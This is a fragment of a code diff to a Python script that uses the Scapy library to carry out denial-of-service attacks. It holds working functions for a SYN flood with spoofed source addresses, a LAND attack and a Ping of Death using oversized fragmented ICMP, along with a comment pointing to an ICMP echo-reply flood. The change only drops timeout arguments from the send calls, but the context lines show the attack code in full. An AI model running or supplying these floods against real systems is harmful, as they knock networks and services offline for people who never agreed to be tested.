@@ -38,7 +38,7 @@ def syn_flood(target_ip, target_port, src_ip="192.168.147.151", packets_send=100
         send(a / str('X' * 54540), verbose=False, timeout=2, count=packets_send)
     else:
         a = IP(src=src_ip, dst=target_ip)/TCP(flags="S", sport=RandShort(), dport=int(target_port))
-        send(a, verbose=False, count=packets_send, timeout=3, inter=1)
+        send(a, verbose=False, count=packets_send, inter=1)
     # another way to do this is to use
     # ans, unans = srloop(p, inter=0.3, retry=2, timeout=4)
     # ans.summary()
@@ -52,11 +52,11 @@ def land(target_ip, target_port, packets_send=1000, naive=True):
     if naive:
         i = IP(src=target_ip, dst=target_ip)
         u = UDP(sport=int(target_port), dport=int(target_port))
-        send(i / u, verbose=False, count=packets_send, timeout=3, inter=1)
+        send(i / u, verbose=False, count=packets_send, inter=1)
     else:
         i = IP(src=target_ip, dst=target_ip)
         u = UDP(sport=int(target_port), dport=int(target_port))
-        send(i / u, verbose=False, count=packets_send, timeout=3, inter=1)
+        send(i / u, verbose=False, count=packets_send, inter=1)
     print("Land attack complete!")
 
 
@@ -68,11 +68,11 @@ def pod(target_ip, src_ip="192.168.147.154", naive=True):
     if naive:
         i = IP(src=src_ip, dst=target_ip)
         f = fragment(i/ICMP()/(str('X' * 60000)))
-        send(f, verbose=False, timeout=3)
+        send(f, verbose=False)
     else:
         i = IP(src=src_ip, dst=target_ip)
         f = fragment(i/ICMP()/(str('X' * 60000)))
-        send(f, verbose=False, timeout=3, inter=1)
+        send(f, verbose=False, inter=1)
 
 
 # Denial of service icmp echo reply flood
